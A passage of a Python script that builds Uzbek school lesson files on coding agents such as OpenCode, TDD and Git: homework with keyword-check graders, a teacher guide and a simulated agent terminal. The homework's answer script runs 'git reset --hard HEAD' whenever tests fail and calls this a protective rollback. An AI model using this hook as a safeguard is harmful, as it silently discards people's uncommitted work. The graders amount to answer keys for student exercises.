    <p style="font-size:13px;" data-ru="Напишите bash-скрипт pre-commit проверки: если команда npm test падает (exit code != 0), сделать git reset --hard HEAD:" data-en="Write a bash script executing npm test: if exit code != 0, trigger git reset --hard HEAD rollback:">Agar npm test xato bersa (exit code != 0), zudlik bilan git reset --hard HEAD qiluvchi xavfsizlik skriptini yozing:</p>
    <div class="code-area">
      <textarea id="codeTier3" rows="8" style="width:100%; font-family:monospace; font-size:12px; padding:10px; border-radius:6px; border:1px solid #cbd5e1;" data-placeholder-ru="#!/bin/bash ..." data-placeholder-en="#!/bin/bash ...">
#!/bin/bash
echo "Avtonom testlar tekshirilmoqda..."
npm test
if [ $? -ne 0 ]; then
    echo "XATO: Testlar quladi! Barcha o'zgarishlar bekor qilinmoqda..."
    git reset --hard HEAD
    exit 1
fi
echo "Barcha testlar yashil! Commitga ruxsat berildi."
exit 0
</textarea>
    </div>
    <button onclick="testTier3()" class="btn" style="margin-top:8px; padding:6px 14px; background:var(--danger); color:#fff; border:none; border-radius:6px; cursor:pointer;" data-ru="Проверить скрипт" data-en="Test Shell Script">Skriptni Sinash</button>
    <span id="resTier3" style="margin-left:10px; font-weight:700;"></span>
  </div>

  <script>
    function testTier1() {
      var txt = document.getElementById('codeTier1').value;
      var res = document.getElementById('resTier1');
      if (txt.includes('AGENTS.md') && txt.includes('calculateDiscount') && txt.includes('toThrow')) {
        res.textContent = "✅ Barakalla! AGENTS.md va Qizil Test to'g'ri shakllantirildi (+4 ball)";
        res.style.color = "var(--success)";
      } else {
        res.textContent = "❌ Xatolik: AGENTS.md qoidalari va toThrow() testini kiriting!";
        res.style.color = "var(--danger)";
      }
    }

    function testTier2() {
      var txt = document.getElementById('codeTier2').value;
      var res = document.getElementById('resTier2');
      if (txt.includes('price < 0') && txt.includes('percent > 100') && txt.includes('throw new Error')) {
        res.textContent = "✅ Ajoyib! Funksiya barcha chekka holatlardan to'liq himoyalandi (+4 ball)";
        res.style.color = "var(--success)";
      } else {
        res.textContent = "❌ Xatolik: manfiy narx, percent > 100 va throw new Error tekshiruvlarini kiriting!";
        res.style.color = "var(--danger)";
      }
    }

    function testTier3() {
      var txt = document.getElementById('codeTier3').value;
      var res = document.getElementById('resTier3');
      if (txt.includes('npm test') && txt.includes('git reset --hard HEAD')) {
        res.textContent = "✅ Mukammal! Kiber-Rollback qalqoni xatolar yuz berganda loyihani saqlab qoladi (+2 ball)";
        res.style.color = "var(--success)";
      } else {
        res.textContent = "❌ Xatolik: npm test va git reset --hard HEAD buyruqlaridan foydalaning!";
        res.style.color = "var(--danger)";
      }
    }
  </script>
"""
    tpl = re.sub(r'<main class="container">[\s\S]*?</main>', lambda m: f'<main class="container">\n{hw_body}\n</main>', tpl)

    out_path = os.path.join(DEST_DIR, "vazifa.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: vazifa.html")

def build_teacher_reading():
    doc = """# O'qituvchi Qo'llanmasi (Teacher Reading)
## 10–11-sinf · 12-hafta · 32-dars
### Mavzu: Avtonom Kod Yozuvchi Agentlar va CLI Vositalari: OpenCode, Claude Code va TDD Refaktoring
**Dars formati:** Juftlik Dars (Double Block — 80 daqiqa / 2-soatlik dars)

---

### 1. Darsning Pedagogik Maqsadi va Falsafasi
Bugungi 32-darsda 10–11-sinf o'quvchilari zamonaviy dasturlashning eng ilg'or paradigmasiga qadam qo'yadilar: **Terminal-First AI Agentlari**.
O'tgan 31-darsda o'rganilgan Computer-Use ko'rish tizimidan farqli ravishda, bu yerda agent to'g'ridan-to'g'ri fayllar tizimi va terminal bilan ishlaydi.
O'quvchilar **OpenCode** CLI agentidan foydalangan holda TDD (Test-Driven Development) usulida dastur yaratishni va Git orqali nazorat qilishni o'rganadilar.

---

### 2. Darsning 80 Daqiqalik Aniq Xronometraji

#### 1-BOSQICH (40 daqiqa) — Teoriya, Arxitektura va Viktorina
- **00:00–05:00 (5 min):** Kirish, dars mavzusi va maqsadlarini e'lon qilish.
- **05:00–13:00 (8 min):** 31-dars uy vazifasi tahlili: Retina koordinatalar masshtabi xatosi va blitz savol.
- **13:00–19:00 (6 min):** Nega IDE plaginlari o'rniga CLI agentlari (OpenCode)? Terminal-first paradigmasi.
- **19:00–25:00 (6 min):** OpenCode ning 5 ta asosiy vositasi: `read_file`, `edit_file`, `run_command`, `search_files`, `git_diff`.
- **25:00–31:00 (6 min):** TDD metodologiyasi: Qizil (RED) -> Yashil (GREEN) -> Refaktor.
- **31:00–37:00 (6 min):** Ko'p faylli refaktoring va importlar yaxlitligi.
- **37:00–40:00 (3 min):** Git checkpoints va `git reset --hard HEAD` xaloskor qalqoni.

#### 2-BOSQICH (40 daqiqa) — Xavfsizlik, Laboratoriya va Yakun
- **40:00–45:00 (5 min):** Kiberxavfsizlik: Shell buyruqlarini tekshirish va Human-in-the-Loop (HITL) ruxsat tizimi.
- **45:00–50:00 (5 min):** Interaktiv Quiz: 4 ta muhandislik savoli.
- **50:00–55:00 (5 min):** `AGENTS.md` loyiha konstitutsiyasini yozish.
- **55:00–68:00 (13 min):** Katta Amaliy Laboratoriya: `simulator/index.html` da OpenCode orqali TDD kalkulyator yaratish.
- **68:00–74:00 (6 min):** Juftlikda Peer-Review: git diff tekshiruvi va 2 nafar o'quvchining Smartboardda jonli demosi.
- **74:00–77:00 (3 min):** Subagentlar me'morchiligi haqida tushuncha.
- **77:00–80:00 (3 min):** Dars yakuni, 3 darajali uy vazifasi tushuntirilishi va baholash.

---

### 3. O'qituvchi Uchun Chuqur Texnik Savollar va Javoblar

1. **Savol:** Nega TDD (Test-Driven Development) da avval test yozilishi shart?
   - **Javob:** Agar kod yozilgandan keyin test yozilsa, test qasddan kodga moslab qo'yilishi (confirmation bias) mumkin. Avval yozilgan test qat'iy talabni belgilaydi va avval xato (RED) berib, so'ng to'g'ri kod bilan yashil (GREEN) bo'lishi sifat kafolatidir.
2. **Savol:** Agent loyihadagi fayllarni o'zgartirganda nega `git status` va `git diff` ni tekshirish shart?
   - **Javob:** Agent so'ralmagan boshqa fayllarni yoki o'chirmaslik kerak bo'lgan funksiyalarni tasodifan o'zgartirib yubormaganligini ko'rish uchun. Har bir qator o'zgarish inson ko'rigidan (Code Review) o'tishi kerak.
3. **Savol:** Nega OpenCode kabi CLI agentlariga `rm -rf` kabi buyruqlarga avtomatik ruxsat berish xavfli?
   - **Javob:** Prompt injection yoki xato fikrlash tufayli agent butun repozitoriyni yoki operatsion tizim ildizini o'chirib yuborishi mumkin. Har doim Human-in-the-Loop (inson tasdig'i) yoqilgan bo'lishi shart.
"""
    out_path = os.path.join(DEST_DIR, "TEACHER_READING.md")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(doc)
    print("  ✓ Created: TEACHER_READING.md")

def build_simulator():
    html = """<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title data-ru="OpenCode CLI Студия: Автономный TDD Агент" data-en="OpenCode CLI Studio: Autonomous TDD Agent">OpenCode CLI Studio: Avtonom TDD Agenti</title>
  <style>
    :root {
      --bg: #0b0f19;
      --panel: #111827;
      --card: #1f2937;
      --border: #374151;
      --ink: #f9fafb;
      --ink-dim: #9ca3af;
      --accent: #3b82f6;
      --success: #22c55e;
      --danger: #ef4444;
      --warning: #eab308;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
      background: var(--bg);
      color: var(--ink);
      height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }
    header {
      background: var(--panel);
      border-bottom: 1px solid var(--border);
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .badge-sub {
      background: rgba(59,130,246,0.2);
      color: var(--accent);
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 11px;
      font-weight: 700;
    }
    .main-grid {
      flex: 1;
      display: grid;
      grid-template-columns: 280px 1fr 340px;
      overflow: hidden;
    }
    .file-tree {
      background: var(--panel);
      border-right: 1px solid var(--border);
      display: flex;
      flex-direction: column;
    }
    .tree-header { padding: 12px; border-bottom: 1px solid var(--border); font-size: 12px; font-weight: 700; }
    .tree-item {
      padding: 6px 12px;
      font-size: 11px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
      color: var(--ink-dim);
    }
    .tree-item:hover, .tree-item.active { background: rgba(59,130,246,0.15); color: #fff; }
    .editor-pane {
      display: flex;
      flex-direction: column;
      background: #090d16;
      border-right: 1px solid var(--border);
    }
    .editor-header {
      background: #1e293b;
      padding: 8px 12px;
      font-size: 11px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .editor-content {
      flex: 1;
      padding: 12px;
      font-family: monospace;
      font-size: 11px;
      overflow-y: auto;
      line-height: 1.6;
      color: #38bdf8;
    }
    .cli-pane {
      display: flex;
      flex-direction: column;
      background: #000;
    }
    .cli-header {
      background: #1e293b;
      padding: 8px 12px;
      font-size: 11px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .cli-output {
      flex: 1;
      padding: 12px;
      font-family: monospace;
      font-size: 11px;
      overflow-y: auto;
      line-height: 1.6;
      color: #94a3b8;
    }
    .cli-input-bar {
      background: #0f172a;
      border-top: 1px solid #334155;
      padding: 8px 12px;
      display: flex;
      gap: 8px;
    }
    .cli-input {
      flex: 1;
      background: transparent;
      border: none;
      color: #fff;
      font-family: monospace;
      font-size: 11px;
      outline: none;
    }
    .btn {
      background: #374151;
      color: #fff;
      border: none;
      padding: 4px 10px;
      border-radius: 4px;
      font-size: 11px;
      cursor: pointer;
      font-weight: 700;
    }
    .btn.op { background: var(--accent); }
    .btn:hover { opacity: 0.9; }
    .chip {
      background: #1f2937;
      color: #93c5fd;
      border: 1px solid #374151;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 10px;
      cursor: pointer;
    }
    .chip:hover { background: #374151; }
  </style>
</head>
<body>

<header>
  <div style="display:flex; align-items:center; gap:12px;">
    <strong data-ru="OpenCode CLI TUI Studio" data-en="OpenCode CLI TUI Studio">OpenCode CLI TUI Studio</strong>
    <span class="badge-sub" data-ru="Автономный TDD Агент" data-en="Autonomous TDD Agent">Avtonom TDD Agenti</span>
  </div>
  <div style="display:flex; gap:10px;">
    <button onclick="toggleLang()" class="btn" id="langBtn" data-ru="UZ / RU / EN" data-en="UZ / RU / EN">UZ / RU / EN</button>
    <button onclick="resetLab()" class="btn" data-ru="Сброс" data-en="Reset">Qayta yuklash</button>
  </div>
</header>

<div class="main-grid">
  <!-- File Tree -->
  <div class="file-tree">
    <div class="tree-header" data-ru="Проводник Проекта" data-en="Project Files">Loyiha Fayllari</div>
    <div class="tree-item active" onclick="switchFile('calc')">📄 src/calculator.js</div>
    <div class="tree-item" onclick="switchFile('test')">🧪 tests/calc.test.js</div>
    <div class="tree-item" onclick="switchFile('agents')">📋 AGENTS.md</div>
    <div class="tree-item" onclick="switchFile('pkg')">📦 package.json</div>

    <div style="margin-top:auto; padding:12px; border-top:1px solid var(--border); font-size:11px;">
      <div><span data-ru="Тесты Jest:" data-en="Jest Status:">Jest Holati:</span> <strong id="testStatus" style="color:#ef4444;" data-ru="RED (1 failing)" data-en="RED (1 failing)">RED (1 failing)</strong></div>
      <div style="margin-top:4px;"><span data-ru="Git Ветка:" data-en="Git Branch:">Git Holati:</span> <strong id="gitStatus" style="color:#38bdf8;">main (uncommitted)</strong></div>
    </div>
  </div>

  <!-- Code Editor Pane -->
  <div class="editor-pane">
    <div class="editor-header">
      <span id="activeFileTitle">src/calculator.js</span>
      <span style="color:#64748b;">JavaScript (ES Modules)</span>
    </div>
    <div class="editor-content" id="editorContent">
<pre id="codePre">export function divide(a, b) {
  // TODO: Implement zero division protection
  return a / b;
}</pre>
    </div>
  </div>

  <!-- OpenCode CLI Pane -->
  <div class="cli-pane">
    <div class="cli-header">
      <div>opencode v1.19.6</div>
      <div style="color:#22c55e;">● Ready</div>
    </div>
    <div class="cli-output" id="cliOutput">
      <div style="color:#64748b;" data-ru="[OpenCode готов к работе] Введите промпт или нажмите быстрые кнопки ниже." data-en="[OpenCode ready] Issue command or click prompts below.">[OpenCode tayyor] Prompt kiriting yoki quyidagi tugmalarni bosing.</div>
    </div>
    <div style="display:flex; gap:4px; padding:6px 12px; background:#0b0f19; border-top:1px solid #1f2937; overflow-x:auto;">
      <button class="chip" onclick="runPrompt('tdd_run')" data-ru="npm test (Запуск TDD)" data-en="npm test (Run TDD)">1. npm test (Qizil Test)</button>
      <button class="chip" onclick="runPrompt('agent_fix')" data-ru="OpenCode: Реализуй divide()" data-en="OpenCode: Implement divide()">2. OpenCode: Kodni Yoz</button>
      <button class="chip" onclick="runPrompt('git_diff')" data-ru="git diff" data-en="git diff">3. git diff</button>
      <button class="chip" onclick="runPrompt('git_commit')" data-ru="git commit" data-en="git commit">4. git commit</button>
    </div>
    <div class="cli-input-bar">
      <span style="color:#22c55e; font-family:monospace; font-size:11px;">$ opencode &gt;</span>
      <input type="text" id="cliInput" class="cli-input" placeholder="divide() funksiyasini tuzat va testlarni yurgiz..." data-placeholder-ru="Введите промпт..." data-placeholder-en="Type prompt..." onkeydown="handleEnter(event)">
    </div>
  </div>
</div>

<script>
var curLang = 'uz';
var activeFile = 'calc';
var isFixed = false;
var isCommitted = false;

var files = {
  calc: 'export function divide(a, b) {\\n  // TODO: Implement zero division protection\\n  return a / b;\\n}',
  calcFixed: 'export function divide(a, b) {\\n  if (b === 0) {\\n    throw new Error("Cannot divide by zero");\\n  }\\n  return a / b;\\n}',
  test: 'import { divide } from "../src/calculator.js";\\n\\ntest("divides positive numbers", () => {\\n  expect(divide(10, 2)).toBe(5);\\n});\\n\\ntest("throws error on zero division", () => {\\n  expect(() => divide(10, 0)).toThrow("Cannot divide by zero");\\n});',
  agents: '# AGENTS.md\\n- Stack: Node.js ES Modules\\n- Testing: Jest TDD enforced\\n- Safety: Strict error throwing on invalid inputs',
  pkg: '{\\n  "name": "tdd-calc",\\n  "version": "1.0.0",\\n  "scripts": { "test": "jest" },\\n  "devDependencies": { "jest": "^29.5.0" }\\n}'
};

function toggleLang() {
  if (curLang === 'uz') curLang = 'ru';
  else if (curLang === 'ru') curLang = 'en';
  else curLang = 'uz';
  document.getElementById('langBtn').textContent = curLang.toUpperCase();
  applyLang();
}

function applyLang() {
  var els = document.querySelectorAll('[data-ru]');
  els.forEach(function(el) {
    if (curLang === 'ru') el.textContent = el.getAttribute('data-ru');
    else if (curLang === 'en') el.textContent = el.getAttribute('data-en');
  });
}

function switchFile(key) {
  activeFile = key;
  var title = document.getElementById('activeFileTitle');
  var pre = document.getElementById('codePre');
  
  if (key === 'calc') {
    title.textContent = 'src/calculator.js';
    pre.textContent = isFixed ? files.calcFixed : files.calc;
  } else if (key === 'test') {
    title.textContent = 'tests/calc.test.js';
    pre.textContent = files.test;
  } else if (key === 'agents') {
    title.textContent = 'AGENTS.md';
    pre.textContent = files.agents;
  } else if (key === 'pkg') {
    title.textContent = 'package.json';
    pre.textContent = files.pkg;
  }
}

function printCLI(line) {
  var out = document.getElementById('cliOutput');
  var d = document.createElement('div');
  d.innerHTML = line;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
}

function handleEnter(e) {
  if (e.key === 'Enter') {
    var val = document.getElementById('cliInput').value.trim();
    document.getElementById('cliInput').value = '';
    if (val) runPrompt('agent_fix');
  }
}

function runPrompt(type) {
  if (type === 'tdd_run') {
    printCLI('<span style="color:#22c55e;">$ npm test</span>');
    if (!isFixed) {
      printCLI('<span style="color:#ef4444; font-weight:700;">FAIL tests/calc.test.js</span>');
      printCLI('  ✕ throws error on zero division (received 10/0 = Infinity)');
      printCLI('<span style="color:#ef4444;">Tests: 1 failed, 1 passed, 2 total</span>');
      document.getElementById('testStatus').textContent = "RED (1 failing)";
      document.getElementById('testStatus').style.color = "#ef4444";
    } else {
      printCLI('<span style="color:#22c55e; font-weight:700;">PASS tests/calc.test.js</span>');
      printCLI('  ✓ divides positive numbers (2 ms)\\n  ✓ throws error on zero division (1 ms)');
      printCLI('<span style="color:#22c55e;">Tests: 2 passed, 2 total (100% Green)</span>');
      document.getElementById('testStatus').textContent = "GREEN (100% Passed)";
      document.getElementById('testStatus').style.color = "#22c55e";
    }
  } else if (type === 'agent_fix') {
    printCLI('<span style="color:#38bdf8;">[OpenCode]:</span> Tahlil qilinmoqda (Thought)...');
    printCLI('<span style="color:#a855f7;">⚡ tool: read_file("src/calculator.js")</span>');
    printCLI('<span style="color:#a855f7;">⚡ tool: edit_file("src/calculator.js", target, replacement)</span>');
    
    isFixed = true;
    switchFile(activeFile);

    printCLI('<span style="color:#22c55e;">✔ Kod tuzatildi! Endi testlar qayta yurgizilmoqda...</span>');
    setTimeout(function() {
      runPrompt('tdd_run');
    }, 600);
  } else if (type === 'git_diff') {
    printCLI('<span style="color:#22c55e;">$ git diff</span>');
    if (isFixed && !isCommitted) {
      printCLI('<span style="color:#64748b;">diff --git a/src/calculator.js b/src/calculator.js</span>');
      printCLI('<span style="color:#ef4444;">-  return a / b;</span>');
      printCLI('<span style="color:#22c55e;">+  if (b === 0) {</span>');
      printCLI('<span style="color:#22c55e;">+    throw new Error("Cannot divide by zero");</span>');
      printCLI('<span style="color:#22c55e;">+  }</span>');
      printCLI('<span style="color:#22c55e;">+  return a / b;</span>');
    } else if (isCommitted) {
      printCLI('<span style="color:#64748b;">Working tree clean, no staged diffs.</span>');
    } else {
      printCLI('<span style="color:#64748b;">No changes recorded.</span>');
    }
  } else if (type === 'git_commit') {
    if (isFixed && !isCommitted) {
      isCommitted = true;
      printCLI('<span style="color:#22c55e;">$ git commit -m "feat(calc): handle zero division with tests"</span>');
      printCLI('[main 8f190c2] feat(calc): handle zero division with tests\\n 1 file changed, 4 insertions(+), 1 deletion(-)');
      document.getElementById('gitStatus').textContent = "clean (committed)";
      document.getElementById('gitStatus').style.color = "#22c55e";
    } else {
      printCLI('<span style="color:#eab308;">Hech qanday o\'zgarish yo\'q yoki allaqachon commit qilingan.</span>');
    }
  }
}

function resetLab() {
  isFixed = false;
  isCommitted = false;
  switchFile('calc');
  document.getElementById('cliOutput').innerHTML = '<div style="color:#64748b;">[Qayta yuklandi] Boshlash uchun "npm test" tugmasini bosing.</div>';
  document.getElementById('testStatus').textContent = "RED (1 failing)";
  document.getElementById('testStatus').style.color = "#ef4444";
  document.getElementById('gitStatus').textContent = "main (uncommitted)";
  document.getElementById('gitStatus').style.color = "#38bdf8";
}
</script>

</body>
</html>
"""
    out_path = os.path.join(DEST_DIR, "simulator", "index.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    print("  ✓ Created: simulator/index.html")

def main():
    print("📦 Building 10-11-sinf (Lesson 32: Autonomous Coding Agents & OpenCode)...")
    build_presentation()
    build_worksheet()
    build_homework()
    build_teacher_reading()
    build_simulator()
    print("🎉 Done! Generated Grade 10–11 Lesson 32.")

if __name__ == "__main__":
    main()
